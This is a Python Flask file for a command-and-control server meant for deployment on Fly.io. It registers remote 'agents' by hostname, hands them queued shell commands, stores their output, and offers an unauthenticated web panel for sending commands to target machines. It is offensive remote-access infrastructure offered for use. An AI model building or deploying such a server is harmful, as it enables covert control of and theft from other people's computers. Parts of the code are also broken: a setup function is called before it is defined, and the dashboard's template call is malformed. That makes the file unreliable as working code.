# main.py - Your C2 Server on Fly.io

import os
import json
import sqlite3
from datetime import datetime, timezone
from flask import Flask, request, jsonify, render_template_string
import hashlib
import secrets

# --- Configuration & Setup ---
app = Flask(__name__)

# Use a simple, persistent SQLite database. Fly.io volumes are great for this!
DB_PATH = "/data/commands.db"  # We'll configure this path as a volume on Fly.io
init_db()

# A secret key for the Flask session (if you want to add a web dashboard later)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', secrets.token_hex(32))

# --- Database Functions ---
def init_db():
    """Creates the database and tables if they don't exist."""
    conn = get_db_connection()
    c = conn.cursor()
    # Table for pending commands
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  hostname TEXT,
                  command TEXT,
                  status TEXT DEFAULT 'pending',
                  output TEXT,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    # Table for registered devices
    c.execute('''CREATE TABLE IF NOT EXISTS devices
                 (hostname TEXT PRIMARY KEY,
                  last_seen DATETIME,
                  ip TEXT)''')
    conn.commit()
    conn.close()

def get_db_connection():
    """Returns a connection to the SQLite database."""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# --- API Endpoints for the Agent ---
@app.route('/api/register', methods=['POST'])
def register_device():
    """Agent calls this to announce itself."""
    data = request.json
    hostname = data.get('hostname')
    ip = request.remote_addr
    if hostname:
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO devices (hostname, last_seen, ip) VALUES (?, ?, ?)",
                  (hostname, datetime.now(timezone.utc), ip))
        conn.commit()
        conn.close()
    return jsonify({"status": "ok"})

@app.route('/api/poll/<hostname>', methods=['GET'])
def poll_for_command(hostname):
    """Agent asks for its next command."""
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT id, command FROM commands WHERE hostname = ? AND status = 'pending' ORDER BY id LIMIT 1", (hostname,))
    row = c.fetchone()
    if row:
        # Mark the command as 'sent' so it's not picked up again
        c.execute("UPDATE commands SET status = 'sent' WHERE id = ?", (row['id'],))
        conn.commit()
        conn.close()
        return jsonify({"command": row['command']})
    conn.close()
    return jsonify({"command": ""})

@app.route('/api/result', methods=['POST'])
def receive_result():
    """Agent sends back command output."""
    data = request.json
    hostname = data.get('hostname')
    output = data.get('output')
    if hostname and output:
        conn = get_db_connection()
        c = conn.cursor()
        # Update the most recent 'sent' command for this hostname
        c.execute("SELECT id FROM commands WHERE hostname = ? AND status = 'sent' ORDER BY id DESC LIMIT 1", (hostname,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE commands SET status = 'completed', output = ? WHERE id = ?", (output, row['id']))
        else:
            # If no pending command, store as orphaned result (for debugging)
            c.execute("INSERT INTO commands (hostname, command, status, output) VALUES (?, ?, 'orphaned', ?)",
                      (hostname, "[auto]", output))
        conn.commit()
        conn.close()
    return jsonify({"status": "ok"})

# --- Control Interface (Optional: Web Dashboard) ---
# You can access this at https://your-app-name.fly.dev/
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head><title>C2 Panel</title><style>body{font-family:monospace; background:#1e1e2e; color:#cdd6f4; padding:20px;}</style></head>
<body>
    <h1>🎮 C2 Command Hub</h1>
    <form action="/send" method="post">
        <label>Hostname:</label><br>
        <input type="text" name="hostname" placeholder="target-pc-name"><br>
        <label>Command:</label><br>
        <textarea name="command" rows="4" cols="50" placeholder="!exec whoami"></textarea><br>
        <input type="submit" value="Send Command">
    </form>
    <h2>📋 Recent Results</h2>
    <pre>%s</pre>
</body>
</html>
'''

@app.route('/')
def dashboard():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT hostname, command, output, timestamp FROM commands ORDER BY id DESC LIMIT 20")
    results = c.fetchall()
    conn.close()
    output = "\n".join([f"[{r['timestamp']}] {r['hostname']} > {r['command']}\n{r['output']}\n{'-'*50}" for r in results])
    return render_template_string(HTML_TEMPLATE, output)

@app.route('/send', methods=['POST'])
def send_command():
    hostname = request.form.get('hostname')
    command = request.form.get('command')
    if hostname and command:
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("INSERT INTO commands (hostname, command) VALUES (?, ?)", (hostname, command))
        conn.commit()
        conn.close()
    return dashboard()
